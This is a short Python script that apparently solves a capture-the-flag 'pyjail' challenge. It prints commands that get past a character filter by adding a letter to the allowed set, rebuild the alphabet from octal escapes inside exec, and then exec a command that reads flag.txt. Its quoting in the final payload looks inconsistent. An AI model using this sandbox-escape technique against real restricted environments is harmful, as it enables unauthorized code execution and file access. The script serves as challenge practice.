#first command (injects the letter x into the letters we can use)
print("first command:")
print("abcdef.add(\\\'170\')\n")
#iterate through all int versions of alphabet, convert into oct, turn into literal string
print("second command:")
all_letters = []
for x in range(97, 123):
    all_letters.append("\'\\"+str(oct(x))[2:]+"\'")
print("exec(\"abcdef = [", end = ' ')
for i in range(len(all_letters)):
    if i == len(all_letters)-1:
        print(all_letters[i]+ "]\")\n")
    else:
        print(all_letters[i] + ", ", end='')
#print payload
print("payload/3rd command:")
print("exec(\"with open(\"flag.txt\", \'r\') as a: print(a.readlines())\")\n")
